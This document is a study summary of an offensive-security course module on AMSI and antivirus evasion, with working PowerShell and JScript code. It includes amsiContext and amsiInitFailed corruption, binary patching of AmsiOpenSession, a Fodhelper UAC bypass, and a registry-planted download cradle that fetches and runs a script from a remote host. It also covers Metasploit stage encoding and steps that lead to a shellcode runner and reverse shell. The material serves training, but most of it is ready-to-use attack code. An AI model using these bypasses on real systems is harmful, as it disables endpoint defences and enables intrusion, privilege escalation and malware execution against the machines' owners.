Advanced Antivirus Evasion — Full Summary by Section
1. Overview and Context

The previous module covered basic AV bypasses. This module goes deeper, focusing on AMSI (Antimalware Scan Interface) — Microsoft’s solution to the gap where code runs in memory without ever touching disk.
```
Previous module problem:
┌─────────────────────────────────────────────────────┐
│  PowerShell code downloaded and executed in memory  │
│  → Never written to disk                            │
│  → AV had no chance to scan it                      │
│  → Was NOT detected                                 │
├─────────────────────────────────────────────────────┤
│  Microsoft's answer: AMSI                           │
│  → Scans ALL PowerShell/JScript/VBA at RUNTIME      │
│  → Even if code never touches disk                  │
│  → Passes content to Windows Defender for analysis  │
└─────────────────────────────────────────────────────┘
```
2. Intel Architecture and Assembly Basics
Why we need this

To bypass AMSI we need to modify code at the assembly level. This requires understanding how the CPU executes instructions.
```
Key registers
32-bit:                    64-bit equivalent:
EIP → current instruction  RIP → current instruction
ESP → top of stack         RSP → top of stack
EAX → return values        RAX → return values
ECX → first argument       RCX → first argument
EDX → second argument      RDX → second argument
                           R8  → third argument
                           R9  → fourth argument
```
Calling conventions (critical for understanding arguments)
```
32-bit (__stdcall):
  → ALL arguments passed on the STACK

64-bit (__fastcall):
  → First 4 args: RCX, RDX, R8, R9
  → Remaining args: on the STACK
Key instructions
call  → jumps to function, pushes return address to stack
ret   → pops return address from stack, jumps back
cmp   → compares two values, sets CPU flags
test  → tests bits, sets CPU flags
je    → jump if equal (zero flag = 1)
jne   → jump if not equal (zero flag = 0)
xor   → XOR operation (XOR reg,reg zeroes the register)
```
3. WinDbg Introduction
Basic commands reference
```
# Attach to a running process
File > Attach to Process (or ^ key)

# Set a breakpoint at a function
bp kernel32!writefile

# Continue execution
g

# Step through one instruction at a time
p

# Unassemble next 5 instructions from current position
u rip L5

# View all registers
r

# View a single register
r rax

# Dump memory as 32-bit values
dd rsp

# Dump memory as 32-bit values WITH ASCII
dc rsp

# Dump memory as 64-bit values
dq rsp

# Dump memory at a specific address (1 value)
dd rsp L1

# Modify a DWORD at a memory address
ed rsp 0

# Convert decimal to hex
? 0n140736475571392

# Check memory protections
!vprot 7FFFC3A224C0

# Display callstack / backtrace
k

# List loaded modules
lm m amsi

# Break when a specific DLL loads
sxe ld amsi

# Unassemble a function
u amsi!AmsiOpenSession
u amsi!AmsiOpenSession L1A   (show 0x1A instructions)
```
Example: Setting and triggering a breakpoint
```
# Set breakpoint on WriteFile
0:005> bp kernel32!writefile
0:005> g

# WinDbg stops when Notepad tries to write a file
Breakpoint 0 hit
KERNEL32!WriteFile:
00007fff`d33b21a0 ff259a690500  jmp qword ptr [KERNEL32!_imp_WriteFile]

# Step through instructions
0:000> p
KERNELBASE!WriteFile:
00007fff`cff400b0 48895c2410  mov qword ptr [rsp+10h],rbx

# View registers
0:000> r
rax=0000000000000004 rbx=000002303a156590 rcx=0000000000000438
rdx=000002303a156590 rsi=0000000000000004 ...
rip=00007fffcff400bf rsp=000000634c93e8c8 ...
```
4. Understanding AMSI
What AMSI is
```
AMSI = Antimalware Scan Interface
→ Introduced in Windows 10 (2015)
→ Scans code AT RUNTIME before it executes
→ Works with: PowerShell, JScript, VBScript, VBA (.NET 4.8+, Office 2019+)
→ Only 11 AV vendors support it (at time of writing)
→ Windows Defender is the main implementation
```

How AMSI works (the full flow)
```
PowerShell starts
      ↓
Loads AMSI.DLL into the process
      ↓
AmsiInitialize() → creates amsiContext structure
      ↓
User types a command
      ↓
AmsiOpenSession() → creates a session
      ↓
AmsiScanBuffer() → passes the content to Windows Defender via RPC
      ↓
Windows Defender analyzes it
      ↓
Returns result:
  1     → clean
  32768 → malware detected → PowerShell blocks execution
      ↓
AmsiCloseSession() → closes the session
```
AMSI API function prototypes
```
c
// Called once when PowerShell starts — BEFORE any commands
HRESULT AmsiInitialize(
    LPCWSTR      appName,     // name of the app
    HAMSICONTEXT *amsiContext // ← output: context structure used by all other APIs
);

// Called for each command/session
HRESULT AmsiOpenSession(
    HAMSICONTEXT amsiContext,  // the context from AmsiInitialize
    HAMSISESSION *amsiSession  // ← output: session handle
);

// The actual scanning function (supersedes AmsiScanString)
HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,  // context
    PVOID        buffer,       // ← THE CONTENT BEING SCANNED
    ULONG        length,       // size of content
    LPCWSTR      contentName,  // identifier
    HAMSISESSION amsiSession,  // session handle
    AMSI_RESULT  *result       // ← output: 1=clean, 32768=malicious
);

// Called after scanning to close the session
HRESULT AmsiCloseSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION amsiSession
);
```
Result values
```
AMSI_RESULT:
  1     → AMSI_RESULT_CLEAN (safe)
  32768 → AMSI_RESULT_DETECTED (malicious)
```
5. Tracing AMSI with Frida

Starting a Frida trace session
```
bash
# Trace ALL functions starting with "Amsi" in amsi.dll
# -p = process ID of PowerShell
# -x = DLL to instrument
# -i = function name filter (* = wildcard)
frida-trace -p 1584 -x amsi.dll -i Amsi*
```
Modifying the AmsiScanBuffer handler to see what’s being scanned

Handler file location:
```
C:\Users\Offsec\__handlers__\amsi.dll\AmsiScanBuffer.js
```
Default content (shows nothing useful):
```
javascript
onEnter: function (log, args, state) {
    log('AmsiScanBuffer()');
},
onLeave: function (log, retval, state) {
}
```
Modified content (shows all arguments and the scan result):
```
javascript
onEnter: function (log, args, state) {
    log('[*] AmsiScanBuffer()');
    log('|- amsiContext: ' + args[0]);
    log('|- buffer: ' + Memory.readUtf16String(args[1])); // ← actual content being scanned
    log('|- length: ' + args[2]);
    log('|- contentName ' + args[3]);
    log('|- amsiSession ' + args[4]);
    log('|- result ' + args[5] + "\n");
    this.resultPointer = args[5]; // save result pointer for onLeave
},
onLeave: function (log, retval, state) {
    log('[*] AmsiScanBuffer() Exit');
    resultPointer = this.resultPointer;
    log('|- Result value is: ' + Memory.readUShort(resultPointer) + "\n");
}
Example trace output — clean input (“test”)
AmsiScanBuffer()
|- amsiContext: 0x1f862fa6f40
|- buffer: test
|- length: 0x8
|- result 0x599f9ce948

AmsiScanBuffer() Exit
|- Result value is: 1       ← CLEAN
Example trace output — malicious input (“AmsiUtils”)
AmsiScanBuffer()
|- amsiContext: 0x1f862fa6f40
|- buffer: 'AmsiUtils'
|- length: 0x16

AmsiScanBuffer() Exit
|- Result value is: 32768   ← MALICIOUS
```
Simple bypass already possible — string splitting

```
powershell
# Detected:
PS> 'AmsiUtils'
# This script contains malicious content and has been blocked...

# NOT detected:
PS> 'Am'+'siUtils'
AmsiUtils
# → Result value is: 1 (AMSI scans the raw input, not the evaluated result)
```
6. AMSI Bypass #1: Corrupting the amsiContext Structure (Reflection)
Discovery with WinDbg

The amsiContext buffer starts with the ASCII bytes “AMSI”:
```
0:014> dc 0x1f862fa6f40
000001f8`62fa6f40  49534d41 ...  AMSI....  ← first 4 bytes = "AMSI"
```
Inside AmsiOpenSession, the AMSI header is compared:
```
asm
amsi!AmsiOpenSession:
00007fff`c75c24ca  cmp dword ptr [rcx], 49534D41h  ← compares [amsiContext] to "AMSI"
00007fff`c75c24d0  jne amsi!AmsiOpenSession+0x4b   ← if NOT equal, jump to error
...
amsi!AmsiOpenSession+0x4b:
00007fff`c75c250b  mov eax, 80070057h  ← E_INVALIDARG error
00007fff`c75c2510  ret                 ← return immediately
```
Key insight: If the first 4 bytes of amsiContext are NOT “AMSI”, AmsiOpenSession returns E_INVALIDARG and AMSI is effectively disabled.

Proof of concept in WinDbg
```
# Set breakpoint, trigger it, overwrite the AMSI header
0:014> bp amsi!AmsiOpenSession
0:014> g

# When breakpoint hits, overwrite the header
0:006> ed rcx 0     ← zero out the first 4 bytes of amsiContext

# Resume and test
0:006> g

PS> 'amsiutils'
amsiutils          ← NOT detected! AMSI is bypassed
```
Full PowerShell bypass using Reflection

```
powershell
# Step 1: Get all types loaded in the current process
$a = [Ref].Assembly.GetTypes()

# Step 2: Find the AmsiUtils class WITHOUT triggering AMSI
# (we can't use 'AmsiUtils' directly — it's flagged)
# Instead, search for any type with name ending in "iUtils"
Foreach($b in $a) {
    if ($b.Name -like "*iUtils") {$c=$b}
}

# Step 3: Get all NonPublic Static fields in AmsiUtils
$d = $c.GetFields('NonPublic,Static')

# Step 4: Find the amsiContext field WITHOUT using the string "amsi"
# (search for any field name containing "Context")
Foreach($e in $d) {
    if ($e.Name -like "*Context") {$f=$e}
}

# Step 5: Get the actual memory address of amsiContext
$g = $f.GetValue($null)
# → Returns something like: 1514420113440 (decimal address)

# Step 6: Cast to a pointer and overwrite the first 4 bytes with zeros
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
# AMSI is now bypassed!
One-liner version
```
powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
Why this works
Normal flow:
AmsiOpenSession checks [amsiContext] == "AMSI" → TRUE → continues → scans content
```
After bypass:
AmsiOpenSession checks [amsiContext] == "AMSI" → FALSE → returns E_INVALIDARG
→ AMSI never scans anything → all code executes freely
7. AMSI Bypass #2: Corrupting amsiInitFailed (Reflection)
Original bypass (Matt Graeber, 2016)
```
powershell
# Simple one-liner — but the strings are now flagged by Defender
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static')
    .SetValue($null,$true)
```
Problem: Both 'AmsiUtils' and 'amsiInitFailed' are now flagged as malicious.

Updated version using dynamic field discovery

```
powershell
# Find the class dynamically (avoids 'AmsiUtils' string)
$a = [Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}

# Find the field dynamically (avoids 'amsiInitFailed' string)
$d = $c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*nitFailed") {$f=$e}}

# Set amsiInitFailed = $true
$f.SetValue($null,$true)
```
8. AMSI Bypass #3: Binary Patching AmsiOpenSession
Concept

Instead of corrupting data structures, we modify the assembly instructions themselves (hotpatching). This is called binary patching.

Analysis of AmsiOpenSession in WinDbg
```
asm
amsi!AmsiOpenSession:
00007fff`aa0824c0  test rdx,rdx        ← INSTRUCTION TO OVERWRITE
00007fff`aa0824c3  je   AmsiOpenSession+0x4b  ← jump to error if zero flag = 1
00007fff`aa0824c5  test rcx,rcx
00007fff`aa0824c8  je   AmsiOpenSession+0x4b
00007fff`aa0824ca  cmp  dword ptr [rcx],49534D41h  ← check AMSI header
00007fff`aa0824d0  jne  AmsiOpenSession+0x4b
...
00007fff`aa08250b  mov  eax,80070057h  ← E_INVALIDARG error
00007fff`aa082510  ret
```
The patch
ORIGINAL:  TEST RDX,RDX  →  binary: 0x48 0x85 0xD2  (3 bytes)
REPLACE:   XOR RAX,RAX   →  binary: 0x48 0x31 0xC0  (3 bytes, same size)

Why XOR RAX,RAX works:
→ XOR of any value with itself = 0
→ When result is 0, CPU sets Zero Flag = 1
→ The JE (jump if equal) instruction READS the Zero Flag
→ Zero Flag = 1 → JE triggers → jumps to E_INVALIDARG error
→ AmsiOpenSession always returns error → AMSI disabled
After patching
```
asm
amsi!AmsiOpenSession:
00007fff`c3a224c0  xor rax,rax   ← PATCHED (was: test rdx,rdx)
00007fff`c3a224c3  je  AmsiOpenSession+0x4b  ← ALWAYS triggered now
...
← goes straight to E_INVALIDARG → AMSI disabled
```

Full PowerShell implementation
```
powershell
# Reuse LookupFunc from previous modules
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -eq "GetProcAddress") {$tmp+=$_}
    }
    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), 
        $functionName
    ))
}

# Reuse getDelegateType from previous modules
function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        ).DefineDynamicModule('InMemoryModule', $false).
        DefineType('MyDelegateType', 
            'Class, Public, Sealed, AnsiClass, AutoClass', 
            [System.MulticastDelegate])
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public', 
        [System.Reflection.CallingConventions]::Standard, 
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke', 'Public, HideBySig, NewSlot, Virtual', 
        $delType, $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# STEP 1: Resolve the address of AmsiOpenSession
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession

# STEP 2: Change memory protection to allow writing
# AmsiOpenSession is on a PAGE_EXECUTE_READ page (read-only code)
# We need PAGE_EXECUTE_READWRITE (0x40) to write to it
$oldProtectionBuffer = 0
$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualProtect), 
    (getDelegateType @(
        [IntPtr],           # lpAddress
        [UInt32],           # dwSize
        [UInt32],           # flNewProtect
        [UInt32].MakeByRefType()  # lpflOldProtect (output)
    ) ([Bool]))
)
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
# → Returns True if successful
# → Memory is now PAGE_EXECUTE_WRITECOPY (Windows makes a private copy)

# STEP 3: Overwrite the first 3 bytes with XOR RAX,RAX
# XOR RAX,RAX = 0x48 0x31 0xC0
$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

# STEP 4: Restore original memory protections to cover tracks
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
# → 0x20 = PAGE_EXECUTE_READ (original protection)

# AMSI is now permanently patched for this process!
PS> 'amsiutils'
amsiutils   ← NOT detected
```
Memory protection values reference
0x20 = PAGE_EXECUTE_READ       (default for code — read + execute only)
0x40 = PAGE_EXECUTE_READWRITE  (what we need — read + write + execute)
PAGE_EXECUTE_WRITECOPY         (what Windows actually sets — private copy)

9. UAC Bypass Case Study: Fodhelper
The Fodhelper UAC bypass
Fodhelper.exe:
→ Runs at HIGH integrity automatically (no UAC prompt)
→ Looks for registry key: HKCU:\Software\Classes\ms-settings\shell\open\command
→ If key exists with DelegateExecute value → reads the Default value
→ Launches whatever is in the Default value as HIGH integrity process
Basic proof of concept
```
powershell
# Create the registry path and set it to launch PowerShell
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command `
         -Value powershell.exe -Force

# Create the DelegateExecute trigger value
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command `
                 -Name DelegateExecute -PropertyType String -Force

# Launch fodhelper.exe → triggers the bypass → high integrity PowerShell opens
C:\Windows\System32\fodhelper.exe
Problem: Metasploit module fails because of AMSI
msf5> use exploit/windows/local/bypassuac_fodhelper
msf5> set target 1    (Windows x64)
msf5> set session 1
msf5> exploit
```
→ FAILS — AMSI detects the PowerShell payload and kills the session
Solution: Combine Fodhelper bypass with AMSI bypass

The registry value can hold a PowerShell download cradle that includes the AMSI bypass in the hosted script (run.txt):
```
powershell
# Set the registry value to a download cradle
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command `
         -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" `
         -Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command `
                 -Name DelegateExecute -PropertyType String -Force

C:\Windows\System32\fodhelper.exe
```
The hosted run.txt on Kali must include the AMSI bypass at the top, followed by the shellcode runner.

Dealing with stage encoding detection

When Meterpreter’s second stage was detected over the network:
```
msf5> set EnableStageEncoding true
msf5> set StageEncoder x64/zutto_dekiru
# (or x64/xor_dynamic if zutto_dekiru fails)
msf5> exploit
```
→ SUCCESS: Meterpreter session at HIGH integrity level


10. AMSI Bypass in JScript
How AMSI works in JScript (differences from PowerShell)
PowerShell:  One AmsiOpenSession per command → multiple sessions
JScript:     ALL code in ONE single session → no AmsiOpenSession called
             AmsiScanString + AmsiScanBuffer called once for the entire script

Frida trace of JScript execution:
```
AmsiScanString()
  | AmsiScanBuffer()
  |   buffer: IHost.Sleep("20000");
  |           IWshShell3.Run("calc");  ← entire script content at once
  |   Result value is: 32768  ← DETECTED if shellcode is present
Bypass #1: AmsiEnable Registry Key

JScript checks this key before AMSI initializes. If set to 0, AMSI is not enabled.
```
Discovery with WinDbg:
```
# Break on the registry check function in jscript.dll
0:000> bu jscript!JAmsi::JAmsiIsEnabledByRegistry
0:000> g

# Inspect the arguments to RegOpenKeyExW
0:000> du 00007fff`a3b134e0
"SOFTWARE\Microsoft\Windows Script\Settings"

# Inspect the arguments to RegQueryValueExW
0:000> du 7fff`a3b134c0
"AmsiEnable"
```
Full registry path: HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable

Setting the key to disable AMSI:
```
javascript
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
sh.RegWrite(key, 0, "REG_DWORD");  // 0 = AMSI disabled
```
Problem: This key must be set before wscript.exe starts. So we need a self-restarting script:
```
javascript
var filesys = new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";

try {
    // Try to read the registry key
    var AmsiEnable = sh.RegRead(key);
    if(AmsiEnable != 0) {
        throw new Error(1, '');  // Key exists but is not 0 → throw exception
    }
    // If we reach here, AmsiEnable=0 → AMSI is disabled → run shellcode runner
    // ... DotNetToJscript shellcode runner code here ...

} catch(e) {
    // Key doesn't exist OR is not 0 → set it to 0 and restart
    sh.RegWrite(key, 0, "REG_DWORD");

    // Restart the script using cscript.exe with JScript engine GUID
    // {F414C262-6AC0-11CF-B6D1-00AA00BBBB58} = jscript.dll GUID
    sh.Run(
        "cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} " + WScript.ScriptFullName,
        0,   // window style: 0 = hidden
        1    // wait for completion: 1 = wait
    );

    // Restore the key to 1 after the script runs
    sh.RegWrite(key, 1, "REG_DWORD");
    WScript.Quit(1);
}
```
Flow:
```
First execution:
  → Key doesn't exist → exception → catch block runs
  → Sets AmsiEnable = 0
  → Restarts itself via cscript.exe (new process starts with AMSI disabled)
  → Waits for it to finish
  → Restores key to 1
  → Quits

Second execution (new process):
  → Key = 0 → try block succeeds → AMSI is disabled
  → Shellcode runner executes → reverse shell
```
Bypass #2: Renaming wscript.exe to amsi.dll

Discovery: When wscript.exe loads AMSI.DLL, the callstack shows:

jscript!COleScript::Initialize → LoadLibraryExW("amsi.dll")

The DLL name passed is "amsi.dll" without a full path, BUT with the flag LOAD_LIBRARY_SEARCH_SYSTEM32 (0x800) which forces search in System32 first → DLL hijacking is blocked.

James Forshaw’s trick:

If a process named "amsi.dll" tries to load a DLL also named "amsi.dll":
→ LoadLibraryExW sees it's already loaded (the process itself)
→ Aborts the load to avoid duplication
→ All subsequent AMSI API calls fail
→ AMSI is disabled

Key detail: Running a file with .dll extension via ShellExecute fails (DLLs aren’t executed). But CreateProcess (and WScript.Shell’s Exec) ignores the extension and reads the file header to determine it’s a valid executable.

Implementation:
```
javascript
var filesys = new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');

try {
    // Check if our renamed wscript.exe already exists
    if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll") == 0) {
        throw new Error(1, '');  // Doesn't exist yet → go to catch
    }
    // If it exists, we're in the second run → AMSI is disabled → run shellcode
    // ... DotNetToJscript shellcode runner code here ...

} catch(e) {
    // First run: copy wscript.exe as AMSI.dll
    filesys.CopyFile(
        "C:\\Windows\\System32\\wscript.exe",
        "C:\\Windows\\Tasks\\AMSI.dll"
    );

    // Execute the COPY (now named amsi.dll) with the original script
    // Using Exec (wrapper for CreateProcess) → ignores .dll extension
    sh.Exec(
        "C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} " 
        + WScript.ScriptFullName
    );

    WScript.Quit(1);
}
```
Flow:
```
First execution (wscript.exe):
  → AMSI.dll doesn't exist → exception → catch runs
  → Copies wscript.exe → C:\Windows\Tasks\AMSI.dll
  → Executes AMSI.dll (which IS wscript.exe) with the script
  → Quits

Second execution (C:\Windows\Tasks\AMSI.dll = wscript.exe):
  → Process is named "amsi.dll"
  → Tries to load amsi.dll → Windows sees process already has that name
  → Aborts DLL load → AMSI fails to initialize → AMSI disabled
  → Shellcode runner executes → reverse shell ✅
  ```

```
NOTE: Windows Defender may still detect the process named "amsi.dll"
→ Migrate to another process immediately to keep the shell alive
→ Or use process injection/hollowing instead of a shellcode runner
Full Summary: AMSI Bypass Techniques
Technique	Target	Language	Reliability	Stealth
String splitting	AMSI signature check	PowerShell	Low (gets patched)	High
amsiContext corruption	Context structure	PowerShell	High	High
amsiInitFailed flag	Init flag	PowerShell	High	High
Binary patch (XOR)	AmsiOpenSession code	PowerShell	Very High	High
AmsiEnable registry key	Pre-init check	JScript	High	Medium
wscript.exe → amsi.dll	DLL load conflict	JScript	High	Low
Golden Rules of This Module
1. AMSI scans code at RUNTIME — disk evasion alone is not enough
2. Corrupting amsiContext header disables AMSI without crashing PowerShell
3. Binary patching assembly instructions is more reliable than data corruption
4. All bypass techniques must AVOID known signature strings like "AmsiUtils"
5. Dynamic type/field discovery avoids hardcoded flagged strings
6. JScript bypasses work differently than PowerShell bypasses
7. The AmsiEnable registry key must be set BEFORE wscript.exe starts
8. The wscript.exe→amsi.dll trick may trigger Defender → migrate immediately
9. Metasploit's fodhelper module fails against AMSI — always combine bypasses
10. Always encode the second stage (StageEncoder) to avoid network detection
```



### Anothers way

Method 7: Nishang All-in-One
```
powershell
Import-Module .\nishang.ps1
Invoke-AmsiBypass -Verbose
```
Un script que combina 6 métodos diferentes automáticamente. El módulo OffSec no lo menciona — probablemente porque depende de herramientas externas ya conocidas por los vendors.

AmsiTrigger Tool
```powershell
# Herramienta que escanea un script y te dice qué líneas disparan AMSI
.\AmsiTrigger.ps1 -i .\demo.ps1
```
El módulo OffSec no menciona esta herramienta. Es muy útil para obfuscation selectiva.
